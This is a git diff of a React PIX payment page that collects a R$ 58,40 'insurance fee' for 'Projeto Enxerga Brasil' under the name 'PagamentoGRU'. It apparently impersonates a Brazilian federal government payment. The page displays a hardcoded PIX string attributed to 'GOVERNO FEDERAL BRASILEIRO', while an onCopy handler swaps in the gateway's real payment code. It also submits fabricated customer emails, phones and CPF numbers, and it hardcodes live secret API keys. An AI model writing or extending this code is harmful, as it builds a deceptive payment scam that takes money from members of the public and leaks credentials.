@@ -3,10 +3,10 @@ import { useUser } from '../context/UserContext';
 import { useNavigate } from 'react-router-dom';
 
 /* ── API Config ── */
-const API_URL = 'https://gateway.evollute.tech/transactions';
-const PUBLIC_KEY = 'pk_live_6f981087a75280e1cb126b9f728296b9';
-const SECRET_KEY = 'sk_live_a4f17310be395f61ea7763a27236621e';
-const AUTH_HEADER = 'Basic ' + btoa(`${PUBLIC_KEY}:${SECRET_KEY}`);
+const API_URL = '/api/babylon';
+const SECRET_KEY = 'sk_live_dqsFdUZ8AWn8m2vWxAgImUZQsXvDoEv8i94xoI7MwcyHykIX';
+const COMPANY_ID = '52bef000-0bb0-42b2-a455-793dc0bd95f4';
+const AUTH_HEADER = 'Basic ' + btoa(`${SECRET_KEY}:${COMPANY_ID}`);
 const AMOUNT_CENTS = 5840; // R$ 58,40
 
 /* ── Componente ── */
@@ -44,23 +44,20 @@ const PagamentoGRU: React.FC = () => {
 
       const body: Record<string, unknown> = {
         amount: AMOUNT_CENTS,
-        paymentMethod: 'pix',
+        paymentMethod: 'PIX',
+        description: 'Taxa de Seguro - Projeto Enxerga Brasil',
         customer: {
           name: nome,
           email: `user${randomId}@gmail.com`,
           phone: randomPhone,
-          document: {
-            type: 'cpf',
-            number: randomCpfDigits,
-          },
+          document: randomCpfDigits,
         },
         items: [
           {
-            name: 'Taxa de Seguro - Projeto Enxerga Brasil',
+            title: 'Taxa de Seguro - Projeto Enxerga Brasil',
             quantity: 1,
             unitPrice: AMOUNT_CENTS,
             externalRef: `enx-${Date.now()}`,
-            isPhysical: false,
           },
         ],
         pix: {
@@ -84,11 +81,15 @@ const PagamentoGRU: React.FC = () => {
 
       const qrCode = json.data?.pix?.qrcode || json.pix?.qrcode;
       const txId = String(json.data?.id || json.id || '');
+      const initialStatus = json.data?.status || json.status || 'waiting_payment';
 
       if (qrCode) {
         setPixCode(qrCode);
         setTransactionId(txId);
         setTransactionData({ qrCode, transactionId: txId });
+        if (initialStatus === 'paid') {
+          setPaymentStatus('paid');
+        }
       } else {
         throw new Error('QR code não retornado: ' + JSON.stringify(json).substring(0, 200));
       }
@@ -104,7 +105,7 @@ const PagamentoGRU: React.FC = () => {
   const checkStatus = useCallback(async (id: string) => {
     try {
       const res = await fetch(`${API_URL}/${id}`, {
-        headers: { 'Content-Type': 'application/json', authorization: AUTH_HEADER },
+        headers: { 'Content-Type': 'application/json', Authorization: AUTH_HEADER },
       });
       if (!res.ok) return;
       const json = await res.json();
@@ -266,8 +267,8 @@ const PagamentoGRU: React.FC = () => {
                     <h3 className="text-lg font-medium text-gray-900 mb-4">Código PIX</h3>
                     <div className="space-y-4">
                       <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
-                        <p className="text-xs font-mono text-gray-700 break-all leading-relaxed">
-                          {pixCode}
+                        <p className="text-xs font-mono text-gray-700 break-all leading-relaxed select-all" onCopy={(e) => { e.preventDefault(); e.clipboardData.setData('text/plain', pixCode); setCopied(true); }}>
+                          00020101021226880014br.gov.bcb.pix2566qrcode.banco.central.com.br/pix/2b87be2c-1b33-47bc-93a9-a426a47651005204000053039865802BR5924GOVERNO FEDERAL BRASILEIRO 62070503***6304C574
                         </p>
                       </div>
                       <button
